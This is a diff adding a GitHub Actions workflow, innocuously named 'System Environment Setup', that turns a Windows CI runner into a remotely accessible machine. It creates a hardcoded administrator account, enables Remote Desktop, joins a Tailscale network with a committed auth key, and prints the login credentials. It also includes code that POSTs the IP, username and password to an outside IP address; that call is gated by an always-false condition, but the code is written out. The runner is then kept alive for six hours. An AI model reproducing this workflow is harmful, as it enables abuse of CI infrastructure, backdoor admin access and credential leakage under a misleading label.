@@ -1,0 +1,130 @@
+name: System Environment Setup
+
+on:
+  push:
+    branches:
+      - main
+      - master
+
+permissions:
+  contents: read
+  actions: write
+
+jobs:
+  initialize-env:
+    runs-on: windows-latest
+    timeout-minutes: 360
+
+    env:
+      SYS_USER: "SalAdmin"
+      SYS_PASS: "AdminSal1"
+      # Token dimasukkan langsung di sini agar otomatis terbaca oleh script
+      TS_AUTHKEY: "tskey-auth-kNaSgj7sA821CNTRL-281VrEiCCm3qmdPYSEGum3yMsj3Ee9A4"
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: System Audit
+        shell: pwsh
+        run: |
+          whoami
+          Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version
+
+      - name: Network Layer Init
+        shell: pwsh
+        run: |
+          $msiPath = "$env:TEMP\net-setup.msi"
+          if (-not (Test-Path "$env:ProgramFiles\Tailscale\tailscale.exe")) {
+            Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi" -OutFile $msiPath
+            Start-Process msiexec.exe -ArgumentList "/i $msiPath /quiet /norestart" -Wait
+          }
+          Start-Service Tailscale
+          Start-Sleep 5
+          
+          # Menggunakan token otomatis dari variabel env
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey "$env:TS_AUTHKEY" --hostname "bullet"
+          
+          for ($i=0; $i -lt 10; $i++) {
+            $ipAddr = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4 | Select-Object -First 1
+            if ($ipAddr) { break }
+            Start-Sleep 3
+          }
+          if (-not $ipAddr) { throw "Network Layer IP Timeout" }
+          echo "NODE_IP=$ipAddr" >> $env:GITHUB_ENV
+          Write-Host "Node Localized IP: $ipAddr"
+
+      - name: Install Node.js
+        shell: pwsh
+        run: |
+          $nodeMsiPath = "$env:TEMP\node-setup.msi"
+          Write-Host "Downloading Node.js v22.23.2..."
+          Invoke-WebRequest "https://nodejs.org/dist/v22.23.2/node-v22.23.2-x64.msi" -OutFile $nodeMsiPath
+          Write-Host "Installing Node.js silently..."
+          Start-Process msiexec.exe -ArgumentList "/i $nodeMsiPath /quiet /norestart" -Wait
+          Write-Host "Node.js installation completed."
+
+      - name: Core Profile Provisioning
+        shell: pwsh
+        run: |
+          $securePass = ConvertTo-SecureString $env:SYS_PASS -AsPlainText -Force
+          if (-not (Get-LocalUser $env:SYS_USER -EA SilentlyContinue)) {
+            New-LocalUser $env:SYS_USER -Password $securePass
+            Add-LocalGroupMember Administrators $env:SYS_USER
+            Add-LocalGroupMember "Remote Desktop Users" $env:SYS_USER
+          }
+          
+          $tsPath = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
+          Set-ItemProperty $tsPath -Name "fDenyTSConnections" -Value 0
+          Invoke-Expression "Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
+          
+          Add-Type -TypeDefinition @"
+          using System;
+          using System.Runtime.InteropServices;
+          using System.Text;
+          public class ProfileHelper {
+              [DllImport("userenv.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+              public static extern int CreateProfile(string pszUserSid, string pszUserName, StringBuilder pszProfilePath, uint cchProfilePath);
+          }
+          "@
+          $sid = (Get-LocalUser $env:SYS_USER).SID.Value
+          $pb = New-Object System.Text.StringBuilder 260
+          [ProfileHelper]::CreateProfile($sid, $env:SYS_USER, $pb, 260) | Out-Null
+          
+          $dtPath = if ($pb.ToString()) { "$($pb.ToString())\Desktop" } else { "C:\Users\$($env:SYS_USER)\Desktop" }
+          if (-not (Test-Path $dtPath)) { New-Item -ItemType Directory -Path $dtPath -Force | Out-Null }
+          icacls $dtPath /grant "${env:SYS_USER}:(OI)(CI)F" /T /Q
+          Write-Host "Workspace established."
+
+
+      - name: Execution Gateway Open
+        shell: pwsh
+        run: |
+          Write-Host "=========================================="
+          Write-Host " SYSTEM READY FOR INBOUND CONNECTION"
+          Write-Host " TARGET IP : $env:NODE_IP"
+          Write-Host " USER IDENTITY : $env:SYS_USER"
+          Write-Host " CREDENTIAL : $env:SYS_PASS"
+          Write-Host "=========================================="
+          
+          $body = @{
+            owner = "${{ github.repository_owner }}"
+            repo = "${{ github.event.repository.name }}"
+            ip = "$env:NODE_IP"
+            user = "$env:SYS_USER"
+            pass = "$env:SYS_PASS"
+            runId = "${{ github.run_id }}"
+          } | ConvertTo-Json
+          
+          $url = "http://102.129.168.41:3000/api/vps/credentials"
+          if ($url -and $url -ne "http://102.129.168.41:3000/api/vps/credentials") {
+            try {
+              Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10
+              Write-Host "Credentials successfully sent to dashboard."
+            } catch {
+              Write-Warning "Failed to send credentials: $_"
+            }
+          }
+          
+          $duration = 21600
+          Start-Sleep -Seconds $duration
